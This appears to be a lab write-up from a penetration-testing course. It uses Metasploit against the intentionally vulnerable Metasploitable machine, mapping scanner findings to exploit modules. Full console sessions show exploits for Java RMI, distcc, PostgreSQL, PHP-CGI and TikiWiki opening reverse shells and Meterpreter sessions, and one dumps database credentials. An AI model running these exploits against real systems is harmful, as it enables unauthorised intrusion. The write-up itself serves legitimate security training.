!!! danger "Goals"
    1. Practice with Metasploit
    2. Gain access to the Metasploitable machine through several different vulnerabilities in running services

!!! reminder "Methodology"
    1. Take the list of vulnerabilities from **Step 2 - Scanning** <br> <small>(see summary [here](/labs/s2-vulnerability-scanning/#list-of-vulnerabilities) and detailed report [here](http://localhost:8000/labs/s2-vulnerability-scanning/rpt/report-ffu.html))</small>
    2. From the vulnerabilities with highest severity, pick out one <br> <small>(highest severity is *Critical*, then *High* and so on)</small>
    3. Now, map it to a Metasploit exploit <br> <small>(in Metasploit, search for its <abbr title="Common Vulnerability & Exposure">[CVE](https://cve.mitre.org/)</abbr> ID, [Bugtraq](https://en.wikipedia.org/wiki/Bugtraq) ID or a keyword from its description)</small>
    4. Amongst the results, select one and enter exploit's configuration <br> <small>(achieved by *using* the exploit)</small>
    5. Configure the exploit <br> <small>(do not forget to set a PAYLOAD !)</small>
    6. Run the exploit <br> <small>(ultimately, the result should be a command shell, a <abbr title="Meta-Interpreter ; In-memory advanced extensible payload that provides a stealthy communication with a target">[Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)</abbr> or a <abbr title="Virtual Network Computing ; a system for sharing a graphical user interface accross a network, including mouse and keyboard actions">[VNC](https://en.wikipedia.org/wiki/Virtual_Network_Computing)</abbr> client on the target)</small>
    7. Eventually, if exploitation fails, load another payload and step back to 6. <br> <small>(note that not every exploit provides a reverse shell)</small>

**Reference**: [Engelbretson, p85]

---

### Update & Configuration

**Command**: `msfconsole` (update Metasploit with `msfupdate`)

??? note "**Session**"
        :::console
        root@kali:~# msfupdate
        [*]
        [*] Attempting to update the Metasploit Framework...
        [*]

        [*] Checking for updates via the APT repository
        [*] Note: expect weekly(ish) updates using this method
        [*] Updating to version 4.13.6-0kali1
        Reading package lists... Done
        Building dependency tree       
        Reading state information... Done
        The following packages will be upgraded:
          metasploit-framework
        1 upgraded, 0 newly installed, 0 to remove and 109 not upgraded.
        Need to get 69.7 MB of archives.
        After this operation, 95.2 kB disk space will be freed.
        Get:1 http://ftp.belnet.be/kali/kali kali-rolling/main amd64 metasploit-framework amd64 4.13.6-0kali1 [69.7 MB]
        Fetched 69.7 MB in 1min 6s (1,054 kB/s)                                                                                                                                                                  
        apt-listchanges: Reading changelogs...
        (Reading database ... 360789 files and directories currently installed.)
        Preparing to unpack .../metasploit-framework_4.13.6-0kali1_amd64.deb ...
        Unpacking metasploit-framework (4.13.6-0kali1) over (4.13.5-0kali1) ...
        Processing triggers for man-db (2.7.5-2) ...
        Setting up metasploit-framework (4.13.6-0kali1) ...

        root@kali:~# msfconsole 
                                                          
                                  ########                  #
                              #################            #
                           ######################         #
                          #########################      #
                        ############################
                       ##############################
                       ###############################
                      ###############################
                      ##############################
                                      #    ########   #
                         ##        ###        ####   ##
                                              ###   ###
                                            ####   ###
                       ####          ##########   ####
                       #######################   ####
                         ####################   ####
                          ##################  ####
                            ############      ##
                               ########        ###
                              #########        #####
                            ############      ######
                           ########      #########
                             #####       ########
                               ###       #########
                              ######    ############
                             #######################
                             #   #   ###  #   #   ##
                             ########################
                              ##     ##   ##     ##
                                    http://metasploit.com


        Easy phishing: Set up email templates, landing pages and listeners
        in Metasploit Pro -- learn more on http://rapid7.com/metasploit

               =[ metasploit v4.13.6-dev                          ]
        + -- --=[ 1607 exploits - 914 auxiliary - 277 post        ]
        + -- --=[ 458 payloads - 39 encoders - 9 nops             ]
        + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

        msf > setg RHOST 192.168.100.128
        RHOST => 192.168.100.128

        msf > setg RHOSTS 192.168.100.128
        RHOSTS => 192.168.100.128

        msf > setg LHOST 192.168.100.129
        LHOST => 192.168.100.129

        msf > save
        Saved configuration to: /root/.msf4/config

!!! note "Default Settings"
    From here, `RHOST`, `RHOSTS` and `LHOST` are not set anymore as they are global variables saved in a configuration file loaded at Metasploit startup.

---

### Exploit Research

**Command**: `search` (see `help search` for keywords)

??? note "**Session**"
    **(1) TWiki XSS and Command Execution Vulnerabilities**
    
    For this vulnerability, multiple CVE's and <abbr title="Bugtraq ID">BID</abbr>'s are provided.
    
        :::console
        msf > search cve:2008-5304

        msf > search cve:2008-5305

        msf > search bid:32668

        msf > search bid:32669

        msf > search type:exploit platform:linux name:twiki

        msf > search type:exploit name:twiki

        Matching Modules
        ================

           Name                                    Disclosure Date  Rank       Description
           ----                                    ---------------  ----       -----------
           exploit/unix/http/twiki_debug_plugins   2014-10-09       excellent  TWiki Debugenableplugins Remote Code Execution
           exploit/unix/webapp/moinmoin_twikidraw  2012-12-30       manual     MoinMoin twikidraw Action Traversal File Upload
           exploit/unix/webapp/twiki_history       2005-09-14       excellent  TWiki History TWikiUsers rev Parameter Command Execution
           exploit/unix/webapp/twiki_maketext      2012-12-15       excellent  TWiki MAKETEXT Remote Command Execution
           exploit/unix/webapp/twiki_search        2004-10-01       excellent  TWiki Search Function Arbitrary Command Execution

    No result for an XSS on TWiki.
    
    <br>
    
    **(2) Java RMI Server Insecure Default Configuration Remote Code Execution Vulnerabilities**
    
    For this vulnerability, no CVE or BID is provided. Keywords `type`, `platform`, `app` and `name` can be used to refine the search.

        :::console
        msf > search type:exploit platform:linux name:"java rmi"

        Matching Modules
        ================

           Name                                      Disclosure Date  Rank       Description
           ----                                      ---------------  ----       -----------
           exploit/multi/browser/java_signed_applet  1997-02-19       excellent  Java Signed Applet Social Engineering Code Execution
           exploit/multi/misc/java_rmi_server        2011-10-15       excellent  Java RMI Server Insecure Default Configuration Java Code Execution

        ~~~~

        `exploit/multi/browser/java_signed_applet` can be discarded as it does not match current vulnerability's description.

        <br>

        **(3) X Server**

        For this vulnerability, a CVE is provided.

        :::console
        msf > search cve:1999-0526

        Matching Modules
        ================

           Name                            Disclosure Date  Rank    Description
           ----                            ---------------  ----    -----------
           auxiliary/scanner/x11/open_x11                   normal  X11 No-Auth Scanner

    <br>

    **(4) Distributed Ruby (dRuby/DRb) Multiple Remote Code Execution Vulnerabilities**
    
    For this vulnerability, a BID is provided.

        :::console
        msf > search bid:47071

        msf > search type:exploit name:druby

        msf > search type:exploit name:"distributed ruby"

        Matching Modules
        ================

           Name                                    Disclosure Date  Rank       Description
           ----                                    ---------------  ----       -----------
           exploit/linux/misc/drb_remote_codeexec  2011-03-23       excellent  Distributed Ruby Send instance_eval/syscall Code Execution

    <br>

    **(5) distcc Remote Code Execution Vulnerability**

    For this vulnerability, a CVE is provided.

        :::console
        msf > search cve:2004-2687

        Matching Modules
        ================

           Name                           Disclosure Date  Rank       Description
           ----                           ---------------  ----       -----------
           exploit/unix/misc/distcc_exec  2002-02-01       excellent  DistCC Daemon Command Execution

    <br>

    **(6) PostgreSQL weak password**

    For this vulnerability, no CVE or BID is provided.
    
        :::console
        msf > search type:exploit name:postgres platform:linux

        Matching Modules
        ================

           Name                                        Disclosure Date  Rank       Description
           ----                                        ---------------  ----       -----------
           exploit/linux/postgres/postgres_payload     2007-06-05       excellent  PostgreSQL for Linux Payload Execution
           exploit/multi/postgres/postgres_createlang  2016-01-01       good       PostgreSQL CREATE LANGUAGE Execution
    
    `exploit/multi/postgres/postgres_createlang` can be discarded as it is too recent regarding Metasploitable's version.

    <br>

    **(7) DistCC Detection**

    For this vulnerability, no CVE or BID is provided.

        :::console
        msf > search type:exploit platform:linux name:distcc

        msf > search type:exploit platform:unix name:distcc

        Matching Modules
        ================

           Name                           Disclosure Date  Rank       Description
           ----                           ---------------  ----       -----------
           exploit/unix/misc/distcc_exec  2002-02-01       excellent  DistCC Daemon Command Execution

    Same exploit as for **(5) distcc Remote Code Execution Vulnerability**.

    <br>

    **(8) PostgreSQL Multiple Security Vulnerabilities**

    For this vulnerability, multiple CVE's are provided.

        :::console
        msf > search cve:2010-1169

        msf > search cve:2010-1170

        msf > search cve:2010-1447

        msf > search type:exploit name:postgres platform:linux

        Matching Modules
        ================

           Name                                        Disclosure Date  Rank       Description
           ----                                        ---------------  ----       -----------
           exploit/linux/postgres/postgres_payload     2007-06-05       excellent  PostgreSQL for Linux Payload Execution
           exploit/multi/postgres/postgres_createlang  2016-01-01       good       PostgreSQL CREATE LANGUAGE Execution

    Same as for **(8) PostgreSQL Multiple Security Vulnerabilities**.

    <br>

    **(9) vsftpd Compromised Source Packages Backdoor Vulnerability**

    For this vulnerability, a BID is provided.

        :::console
        msf > search bid:48539

        msf > search type:exploit platform:linux name:vsftpd

    No result.

    <br>

    **(10) phpMyAdmin Code Injection and XSS Vulnerability**

    For this vulnerability, a CVE and multiple BID's are provided.

        :::console
        msf > search cve:2009-1151

        Matching Modules
        ================

           Name                                   Disclosure Date  Rank       Description
           ----                                   ---------------  ----       -----------
           exploit/unix/webapp/phpmyadmin_config  2009-03-24       excellent  PhpMyAdmin Config File Code Injection

        msf > search bid:34236

        msf > search bid:34251

    <br>

    **(11) phpMyAdmin BLOB Streaming Multiple Input Validation Vulnerabilities**

    For this vulnerability, a BID is provided.

        :::console
        msf > search bid:34253

        msf > search type:exploit name:phpmyadmin

        Matching Modules
        ================

           Name                                         Disclosure Date  Rank       Description
           ----                                         ---------------  ----       -----------
           exploit/multi/http/phpmyadmin_3522_backdoor  2012-09-25       normal     phpMyAdmin 3.5.2.2 server_sync.php Backdoor
           exploit/multi/http/phpmyadmin_preg_replace   2013-04-25       excellent  phpMyAdmin Authenticated Remote Code Execution via preg_replace()
           exploit/unix/webapp/phpmyadmin_config        2009-03-24       excellent  PhpMyAdmin Config File Code Injection

    Descriptions do not match this of the current vulnerability, all exploits can be discarded.

    <br>

    **(12) phpMyAdmin Configuration File PHP Code Injection Vulnerability**

    For this vulnerability, a CVE and a BID are provided.

        :::console
        msf > search cve:2009-1285

        msf > search bid:34526

        msf > search type:exploit name:phpmyadmin

        Matching Modules
        ================

           Name                                         Disclosure Date  Rank       Description
           ----                                         ---------------  ----       -----------
           exploit/multi/http/phpmyadmin_3522_backdoor  2012-09-25       normal     phpMyAdmin 3.5.2.2 server_sync.php Backdoor
           exploit/multi/http/phpmyadmin_preg_replace   2013-04-25       excellent  phpMyAdmin Authenticated Remote Code Execution via preg_replace()
           exploit/unix/webapp/phpmyadmin_config        2009-03-24       excellent  PhpMyAdmin Config File Code Injection

    As for **(11) phpMyAdmin BLOB Streaming Multiple Input Validation Vulnerabilities**, the two first exploits do not match but `exploit/unix/webapp/phpmyadmin_config` does.

    <br>

    **(13) TikiWiki Versions Prior to 4.2 Multiple Unspecified Vulnerabilities**

    For this vulnerability, multiple CVE's and a BID are provided.

        :::console
        msf > search cve:2010-1133

        msf > search cve:2010-1134

        msf > search cve:2010-1135

        msf > search cve:2010-1136

        msf > search bid:38608

        msf > search type:exploit name:tikiwiki

        Matching Modules
        ================

           Name                                             Disclosure Date  Rank       Description
           ----                                             ---------------  ----       -----------
           exploit/unix/webapp/tikiwiki_graph_formula_exec  2007-10-10       excellent  TikiWiki tiki-graph_formula Remote PHP Code Execution
           exploit/unix/webapp/tikiwiki_jhot_exec           2006-09-02       excellent  TikiWiki jhot Remote Command Execution

    No result.

    <br>

    **(14) PHP-CGI-based setups vulnerability**

    For this vulnerability, multiple CVE's and a BID are provided.

        :::console
        msf > search cve:2012-1823

        Matching Modules
        ================

           Name                                      Disclosure Date  Rank       Description
           ----                                      ---------------  ----       -----------
           exploit/multi/http/php_cgi_arg_injection  2012-05-03       excellent  PHP CGI Argument Injection

        msf > search cve:2012-2311

        msf > search cve:2012-2335

        msf > search cve:2012-2336

        msf > search bid:53388

!!! important "Candidate Modules - Summary"
    | # | NAME | DISCLOSURE <br> DATE | RANK | DESCRIPTION |
    |:---:|:---:|:---:|:---:|:---:|
    | 2 | `exploit/multi/misc/java_rmi_server` | 2011-10-15 | excellent | Java RMI Server Insecure Default Configuration Java Code Execution |
    | 3 | `auxiliary/scanner/x11/open_x11` | | normal | X11 No-Auth Scanner |
    | 4 | `exploit/linux/misc/drb_remote_codeexec` | 2011-03-23 | excellent | Distributed Ruby Send instance_eval/syscall Code Execution |
    | 5, 7 | `exploit/unix/misc/distcc_exec` | 2002-02-01 | excellent | DistCC Daemon Command Execution |
    | 6, 8 | `exploit/linux/postgres/postgres_payload` | 2007-06-05 | excellent | PostgreSQL for Linux Payload Execution |
    | 10, 12 | `exploit/unix/webapp/phpmyadmin_config` | 2009-03-24 | excellent | PhpMyAdmin Config File Code Injection |
    | 13 | `exploit/unix/webapp/tikiwiki_graph_formula_exec` | 2007-10-10 | excellent | TikiWiki tiki-graph_formula Remote PHP Code Execution |
    | 13 | `exploit/unix/webapp/tikiwiki_jhot_exec` | 2006-09-02 | excellent | TikiWiki jhot Remote Command Execution |
    | 14 | `exploit/multi/http/php_cgi_arg_injection` | 2012-05-03 | excellent | PHP CGI Argument Injection |

!!! note
    Nearly all candidate exploits have a rank *excellent*, which means that they should be very likely to succeed and not to cause any disruption on the target.

---

### Exploit Configuration & Run

**Commands**: `use`, `show`, `set`, `unset`, `exploit`

??? note "**Session**"
    **(2) Java RMI Server Insecure Default Configuration Remote Code Execution Vulnerabilities**
    
        :::console
        msf > use exploit/multi/misc/java_rmi_server

        msf exploit(java_rmi_server) > show options

        Module options (exploit/multi/misc/java_rmi_server):

           Name       Current Setting  Required  Description
           ----       ---------------  --------  -----------
           HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
           RHOST      192.168.100.128  yes       The target address
           RPORT      1099             yes       The target port
           SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
           SRVPORT    8080             yes       The local port to listen on.
           SSL        false            no        Negotiate SSL for incoming connections
           SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
           URIPATH                     no        The URI to use for this exploit (default is random)


        Exploit target:

           Id  Name
           --  ----
           0   Generic (Java Payload)


        msf exploit(java_rmi_server) > exploit

        [*] Started reverse TCP handler on 192.168.100.129:4444 
        [*] 192.168.100.128:1099 - Using URL: http://0.0.0.0:8080/D0CYaIZl6300
        [*] 192.168.100.128:1099 - Local IP: http://127.0.0.1:8080/D0CYaIZl6300
        [*] 192.168.100.128:1099 - Server started.
        [*] 192.168.100.128:1099 - Sending RMI Header...
        [*] 192.168.100.128:1099 - Sending RMI Call...
        [*] 192.168.100.128:1099 - Replied to request for payload JAR
        [*] Sending stage (49387 bytes) to 192.168.100.128
        [*] Meterpreter session 1 opened (192.168.100.129:4444 -> 192.168.100.128:45554) at 2016-12-13 18:07:28 +0100
        [*] 192.168.100.128:1099 - Server stopped.


        meterpreter > ls
        Listing: /
        ==========

        Mode              Size     Type  Last modified              Name
        ----              ----     ----  -------------              ----
        40666/rw-rw-rw-   4096     dir   2012-05-14 05:35:33 +0200  bin
        40666/rw-rw-rw-   1024     dir   2012-05-14 05:36:28 +0200  boot
         [...] (SNIPPED)
        40666/rw-rw-rw-   4096     dir   2012-05-20 23:30:19 +0200  var
        100666/rw-rw-rw-  1987288  fil   2008-04-10 18:55:41 +0200  vmlinuz

        meterpreter > 

    Exploitation <font color="green">successful</font>, a Meterpreter session is opened (default payload: `java/meterpreter/reverse_tcp`) !

    <br>

    **(3) X Server**

        :::console
        msf > use auxiliary/scanner/x11/open_x11

        msf auxiliary(open_x11) > show options

        Module options (auxiliary/scanner/x11/open_x11):

           Name     Current Setting  Required  Description
           ----     ---------------  --------  -----------
           Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
           RHOSTS   192.168.100.128  yes       The target address range or CIDR identifier
           RPORT    6000             yes       The target port
           THREADS  1                yes       The number of concurrent threads


        msf auxiliary(open_x11) > exploit

        [-] 192.168.100.128:6000  - 192.168.100.128 Access Denied
        [*] Scanned 1 of 1 hosts (100% complete)
        [*] Auxiliary module execution completed

        msf auxiliary(open_x11) >

    Exploitation <font color="red">failed</font>, access is denied on the target port.

    <br>

    **(4) Distributed Ruby (dRuby/DRb) Multiple Remote Code Execution Vulnerabilities**

        :::console
        msf > use exploit/linux/misc/drb_remote_codeexec

        msf exploit(drb_remote_codeexec) > show options

        Module options (exploit/linux/misc/drb_remote_codeexec):

           Name  Current Setting  Required  Description
           ----  ---------------  --------  -----------
           URI                    yes       The dRuby URI of the target host (druby://host:port)


        Exploit target:

           Id  Name
           --  ----
           0   instance_eval


        msf exploit(drb_remote_codeexec) > set URI druby://192.168.100.128:8787
        URI => druby://192.168.100.128:8787

        msf exploit(drb_remote_codeexec) > exploit

        [*] Started reverse TCP double handler on 192.168.100.129:4444 
        [*] Trying to exploit instance_eval
        [-] instance_eval failed due to security error
        [*] Exploit completed, but no session was created.

        msf exploit(drb_remote_codeexec) > 

    Exploitation <font color="red">failed</font>.

    <br>

    **(5) distcc Remote Code Execution Vulnerability**
    **(7) DistCC Detection**

        :::console
        msf > use exploit/unix/misc/distcc_exec

        msf exploit(distcc_exec) > show options

        Module options (exploit/unix/misc/distcc_exec):

           Name   Current Setting  Required  Description
           ----   ---------------  --------  -----------
           RHOST  192.168.100.128  yes       The target address
           RPORT  3632             yes       The target port


        Exploit target:

           Id  Name
           --  ----
           0   Automatic Target


        msf exploit(distcc_exec) > exploit

        [*] Started reverse TCP double handler on 192.168.100.129:4444 
        [*] Accepted the first client connection...
        [*] Accepted the second client connection...
        [*] Command: echo dkcLo9liXDA5RDQx;
        [*] Writing to socket A
        [*] Writing to socket B
        [*] Reading from sockets...
        [*] Reading from socket B
        [*] B: "dkcLo9liXDA5RDQx\r\n"
        [*] Matching...
        [*] A is input...
        [*] Command shell session 1 opened (192.168.100.129:4444 -> 192.168.100.128:46500) at 2016-12-13 16:08:25 +0100

        ls
        5081.jsvc_up

        cd ..
        ls
        bin
         [...] (SNIPPED)

        ^C
        Abort session 1? [y/N]  y

        [*] 192.168.100.128 - Command shell session 1 closed.  Reason: User exit

        msf exploit(distcc_exec) > 

    Exploitation <font color="green">successful</font>, a reverse shell is opened (default payload: `cmd/unix/reverse`) !

    <br>

    **(6) PostgreSQL weak password**
    **(8) PostgreSQL Multiple Security Vulnerabilities**

        :::console
        msf > use exploit/linux/postgres/postgres_payload

        msf exploit(postgres_payload) > show options

        Module options (exploit/linux/postgres/postgres_payload):

           Name      Current Setting  Required  Description
           ----      ---------------  --------  -----------
           DATABASE  template1        yes       The database to authenticate against
           PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
           RHOST     192.168.100.128  yes       The target address
           RPORT     5432             yes       The target port
           USERNAME  postgres         yes       The username to authenticate as
           VERBOSE   false            no        Enable verbose output


        Exploit target:

           Id  Name
           --  ----
           0   Linux x86


        msf exploit(postgres_payload) > set DATABASE postgres
        DATABASE => postgres

        msf exploit(postgres_payload) > exploit

        [*] Started reverse TCP handler on 192.168.100.129:4444 
        [*] 192.168.100.128:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
        [*] Uploaded as /tmp/FRHjiEGh.so, should be cleaned up automatically
        [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
        [*] Sending stage (1495599 bytes) to 192.168.100.128
        [*] Meterpreter session 2 opened (192.168.100.129:4444 -> 192.168.100.128:46669) at 2016-12-13 18:20:12 +0100


        meterpreter > ls
        Listing: /var/lib/postgresql/8.3/main
        =====================================

        Mode              Size  Type  Last modified              Name
        ----              ----  ----  -------------              ----
        100600/rw-------  4     fil   2010-03-17 15:08:46 +0100  PG_VERSION
        40700/rwx------   4096  dir   2010-03-17 15:08:56 +0100  base
         [...] (SNIPPED)
        100644/rw-r--r--  1224  fil   2010-03-17 15:07:45 +0100  server.crt
        100640/rw-r-----  891   fil   2010-03-17 15:07:45 +0100  server.key

        meterpreter > 

    Exploitation <font color="green">successful</font>, a Meterpreter session is opened (default payload: `linux/x86/meterpreter/reverse_tcp`) !

    <br>

    **(10) phpMyAdmin Code Injection and XSS Vulnerability**
    **(12) phpMyAdmin Configuration File PHP Code Injection Vulnerability**

        :::console
        msf > use exploit/unix/webapp/phpmyadmin_config

        msf exploit(phpmyadmin_config) > show options

        Module options (exploit/unix/webapp/phpmyadmin_config):

           Name     Current Setting  Required  Description
           ----     ---------------  --------  -----------
           Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
           RHOST    192.168.100.128  yes       The target address
           RPORT    80               yes       The target port
           SSL      false            no        Negotiate SSL/TLS for outgoing connections
           URI      /phpMyAdmin/     yes       Base phpMyAdmin directory path
           VHOST                     no        HTTP server virtual host


        Exploit target:

           Id  Name
           --  ----
           0   Automatic (phpMyAdmin 2.11.x < 2.11.9.5 and 3.x < 3.1.3.1)


        msf exploit(phpmyadmin_config) > set URI /phpMyAdmin/index.php
        URI => /phpMyAdmin/index.php

        msf exploit(phpmyadmin_config) > exploit

        [*] Started reverse TCP handler on 192.168.100.129:4444 
        [*] Grabbing session cookie and CSRF token
        [*] Sending save request
        [*] Requesting our payload
        [*] Exploit completed, but no session was created.

        msf exploit(phpmyadmin_config) >

    Exploitation <font color="red">failed</font>, the exploit completes but no reverse shell is opened (default payload: `php/meterpreter/reverse_tcp`). Trying other payloads (e.g. `generic/shell_reverse_tcp` or `php/exec` with a shell command `touch /tmp/test.txt`) does not give any result.

    Note that using default `URI` set to `/phpMyAdmin/` fails with an error telling that the token (an HTML *input* tag) cannot be found.

    <br>

    **(13) TikiWiki Versions Prior to 4.2 Multiple Unspecified Vulnerabilities**

        :::console
        msf > use exploit/unix/webapp/tikiwiki_graph_formula_exec

        msf exploit(tikiwiki_graph_formula_exec) > show options

        Module options (exploit/unix/webapp/tikiwiki_graph_formula_exec):

           Name     Current Setting  Required  Description
           ----     ---------------  --------  -----------
           Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
           RHOST    192.168.100.128  yes       The target address
           RPORT    80               yes       The target port
           SSL      false            no        Negotiate SSL/TLS for outgoing connections
           URI      /tikiwiki        yes       TikiWiki directory path
           VHOST                     no        HTTP server virtual host


        Exploit target:

           Id  Name
           --  ----
           0   Automatic



        msf exploit(tikiwiki_graph_formula_exec) > set PAYLOAD php/exec
        PAYLOAD => php/exec

        msf exploit(tikiwiki_graph_formula_exec) > set CMD touch /tmp/test.txt
        CMD => touch /tmp/test.txt

        msf exploit(tikiwiki_graph_formula_exec) > exploit

        [*] Attempting to obtain database credentials...
        [*] The server returned            : 200 OK
        [*] Server version                 : Apache/2.2.8 (Ubuntu) DAV/2
        [*] TikiWiki database informations : 

        db_tiki   : mysql
        dbversion : 1.9
        host_tiki : localhost
        user_tiki : root
        pass_tiki : 
        dbs_tiki  : tikiwiki

        [*] Attempting to execute our payload...
        [*] Exploit completed, but no session was created.

        msf exploit(tikiwiki_graph_formula_exec) >

    Exploitation <font color="green">successful</font>, the exploit completes, no reverse shell is opened (default payload: `php/meterpreter/reverse_tcp`) but the payload `php/exec` with a shell command `touch /tmp/test.txt` succeeds in creating the file on the target.

        :::console
        msf > use exploit/unix/webapp/tikiwiki_jhot_exec

        msf exploit(tikiwiki_jhot_exec) > show options

        Module options (exploit/unix/webapp/tikiwiki_jhot_exec):

           Name     Current Setting  Required  Description
           ----     ---------------  --------  -----------
           Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
           RHOST    192.168.100.128  yes       The target address
           RPORT    80               yes       The target port
           SSL      false            no        Negotiate SSL/TLS for outgoing connections
           URI      /tikiwiki/       yes       TikiWiki directory path
           VHOST                     no        HTTP server virtual host


        Payload options (cmd/unix/reverse):

           Name   Current Setting  Required  Description
           ----   ---------------  --------  -----------
           LHOST  192.168.100.129  yes       The listen address
           LPORT  4444             yes       The listen port


        Exploit target:

           Id  Name
           --  ----
           0   Automatic


        msf exploit(tikiwiki_jhot_exec) > set URI /tikiwiki/tiki-index.php
        URI => /tikiwiki/tiki-index.php

        msf exploit(tikiwiki_jhot_exec) > exploit

        [*] Started reverse TCP double handler on 192.168.100.129:4444 
        [*] Successfully created temporary file.
        [-] No response from the server
        [*] Successfully remove temporary file.
        [*] Exploit completed, but no session was created.

        msf exploit(tikiwiki_jhot_exec) > 

    Exploitation <font color="red">failed</font>, the exploit completes and seems to perform file operations but no reverse shell is opened (default payload: `cmd/unix/reverese`). Trying other payloads (e.g. `cmd/unix/reverese_bash`) does not give any result.

    <br>

    **(14) PHP-CGI-based setups vulnerability**

        :::console
        msf > use exploit/multi/http/php_cgi_arg_injection

        msf exploit(php_cgi_arg_injection) > show options

        Module options (exploit/multi/http/php_cgi_arg_injection):

           Name         Current Setting  Required  Description
           ----         ---------------  --------  -----------
           PLESK        false            yes       Exploit Plesk
           Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
           RHOST        192.168.100.128  yes       The target address
           RPORT        80               yes       The target port
           SSL          false            no        Negotiate SSL/TLS for outgoing connections
           TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
           URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
           VHOST                         no        HTTP server virtual host


        Exploit target:

           Id  Name
           --  ----
           0   Automatic



        msf exploit(php_cgi_arg_injection) > exploit

        [*] Started reverse TCP handler on 192.168.100.129:4444 
        [*] Sending stage (34122 bytes) to 192.168.100.128
        [*] Meterpreter session 1 opened (192.168.100.129:4444 -> 192.168.100.128:56787) at 2016-12-13 19:34:31 +0100


        meterpreter > ls
        Listing: /var/www
        =================

        Mode              Size   Type  Last modified              Name
        ----              ----   ----  -------------              ----
        41777/rwxrwxrwx   4096   dir   2012-05-20 21:30:29 +0200  dav
        40755/rwxr-xr-x   4096   dir   2012-05-20 21:52:33 +0200  dvwa
         [...] (SNIPPED)
        40775/rwxrwxr-x   20480  dir   2012-05-20 21:22:48 +0200  tikiwiki-old
        40755/rwxr-xr-x   4096   dir   2012-05-20 21:22:48 +0200  twiki

        meterpreter > 

    Exploitation <font color="green">successful</font>, a Meterpreter session is opened (default payload: `php/meterpreter/reverse_tcp`) !

---

!!! note "Remark"
    **Exploited Vulnerabilities**: The research was limited to the first 14 vulnerabilities. The [report](http://localhost:8000/labs/s2-vulnerability-scanning/rpt/report-ffu.html) still contains much more other vulnerabilities that could be tested.

!!! important "Findings"

    **Successful Exploits**:

    | SERVICE | PORT |EXPLOIT | SHELL |
    |:-------:|:----:|:-------:|:-----:|
    | PHP-CGI | 80 | `exploit/multi/http/php_cgi_arg_injection` | Yes |  
    | TikiWiki | 80 | `exploit/unix/webapp/tikiwiki_graph_formula_exec` | No |
    | Java RMI Server | 1099 | `exploit/multi/misc/java_rmi_server` | Yes |
    | DistCC | 3632 | `exploit/unix/misc/distcc_exec` | Yes |
    | PostgreSQL | 5432 | `exploit/linux/postgres/postgres_payload` | Yes |

